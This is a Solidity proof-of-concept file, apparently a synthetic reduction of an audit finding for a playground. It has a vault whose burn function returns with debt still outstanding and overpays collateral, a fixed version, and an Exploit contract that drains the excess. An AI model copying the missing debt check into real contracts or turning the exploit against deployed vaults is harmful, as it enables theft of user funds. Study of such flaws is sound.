// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Radius EVMAuth — _burnGroupBalances does not check remaining debt
    (Trail of Bits, Radius Technology review, finding 62868).
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    The while-loop is the audited body. Expired groups are skipped and the
    function returns while `debt` is still positive. The burn caller still
    treats the ERC1155 burn as complete and refunds collateral for the full
    requested amount. That leaves the group ledger short of backing. */

contract CollateralToken {
    string public name = "Collateral";
    string public symbol = "COLL";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        totalSupply += amount;
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract GroupVault {
    struct Group {
        uint256 balance;
        uint256 expiresAt;
    }

    uint256 public constant COLLATERAL_PER = 100 ether;
    CollateralToken public collateral;
    uint256 public unsettledDebt;
    uint256 public badDebt;
    mapping(address => mapping(uint256 => Group[])) internal _group;
    mapping(address => mapping(uint256 => uint256)) public erc1155Balance;

    constructor(CollateralToken collateral_) {
        collateral = collateral_;
    }

    function seed(address account, uint256 id) external {
        // Report scenario: three tokens already expired, two still live.
        _group[account][id].push(Group({balance: 3, expiresAt: 1}));
        _group[account][id].push(Group({balance: 2, expiresAt: type(uint256).max}));
        erc1155Balance[account][id] = 5;
    }

    function groupBalance(address account, uint256 id, uint256 index) external view returns (uint256) {
        return _group[account][id][index].balance;
    }

    function groupSum(address account, uint256 id) public view returns (uint256 sum) {
        Group[] storage groups = _group[account][id];
        uint256 n = groups.length;
        for (uint256 i = 0; i < n; i++) {
            sum += groups[i].balance;
        }
    }

    function burn(address account, uint256 id, uint256 amount) external {
        _burnGroupBalances(account, id, amount);
        // The ERC1155 ledger is reduced by the full request, as the report describes.
        erc1155Balance[account][id] -= amount;
        uint256 released = amount * COLLATERAL_PER;
        require(collateral.transfer(msg.sender, released), "RELEASE");
        badDebt = unsettledDebt * COLLATERAL_PER;
    }

    function _burnGroupBalances(address account, uint256 id, uint256 amount) internal {
        Group[] storage groups = _group[account][id];
        uint256 _now = block.timestamp;
        uint256 debt = amount;
        uint256 i = 0;
        while (i < groups.length && debt > 0) {
            if (groups[i].expiresAt <= _now) {
                i++;
                continue;
            }
            if (groups[i].balance > debt) {
                // Burn partial token group
                groups[i].balance -= debt;
                debt = 0;
            } else {
                // Burn entire token group
                debt -= groups[i].balance;
                groups[i].balance = 0;
            }
            i++;
        }
        // FIX: require(debt == 0, "DEBT");
        this.settle(debt); // @> VULN: burn returns while debt is still outstanding
    }

    function settle(uint256 debt) external {
        require(msg.sender == address(this), "SELF");
        unsettledDebt = debt;
    }
}

/// @dev Same loop, plus the check the report recommends. Reverts when debt remains.
contract GroupVaultFixed {
    struct Group {
        uint256 balance;
        uint256 expiresAt;
    }

    uint256 public constant COLLATERAL_PER = 100 ether;
    CollateralToken public collateral;
    uint256 public unsettledDebt;
    mapping(address => mapping(uint256 => Group[])) internal _group;
    mapping(address => mapping(uint256 => uint256)) public erc1155Balance;

    constructor(CollateralToken collateral_) {
        collateral = collateral_;
    }

    function seed(address account, uint256 id) external {
        _group[account][id].push(Group({balance: 3, expiresAt: 1}));
        _group[account][id].push(Group({balance: 2, expiresAt: type(uint256).max}));
        erc1155Balance[account][id] = 5;
    }

    function groupBalance(address account, uint256 id, uint256 index) external view returns (uint256) {
        return _group[account][id][index].balance;
    }

    function burn(address account, uint256 id, uint256 amount) external {
        _burnGroupBalances(account, id, amount);
        erc1155Balance[account][id] -= amount;
        uint256 released = amount * COLLATERAL_PER;
        require(collateral.transfer(msg.sender, released), "RELEASE");
    }

    function _burnGroupBalances(address account, uint256 id, uint256 amount) internal {
        Group[] storage groups = _group[account][id];
        uint256 _now = block.timestamp;
        uint256 debt = amount;
        uint256 i = 0;
        while (i < groups.length && debt > 0) {
            if (groups[i].expiresAt <= _now) {
                i++;
                continue;
            }
            if (groups[i].balance > debt) {
                groups[i].balance -= debt;
                debt = 0;
            } else {
                debt -= groups[i].balance;
                groups[i].balance = 0;
            }
            i++;
        }
        require(debt == 0, "DEBT");
        unsettledDebt = debt;
    }
}

contract Exploit {
    CollateralToken public token; // CREATE nonce 1
    GroupVault public vault; // CREATE nonce 2

    constructor() {
        token = new CollateralToken();
        vault = new GroupVault(token);
    }

    function run() external {
        token.mint(address(vault), 5 * vault.COLLATERAL_PER());
        vault.seed(address(this), 1);
        vault.burn(address(this), 1, 4);
        uint256 extracted = token.balanceOf(address(this));
        require(vault.unsettledDebt() == 2, "debt");
        require(vault.badDebt() == 200 ether, "bad debt");
        require(extracted == 400 ether, "extracted");
        require(vault.erc1155Balance(address(this), 1) == 1, "erc1155");
        require(vault.groupSum(address(this), 1) == 3, "groups");
        require(token.balanceOf(address(vault)) == 100 ether, "treasury");
        token.transfer(msg.sender, extracted);
    }
}
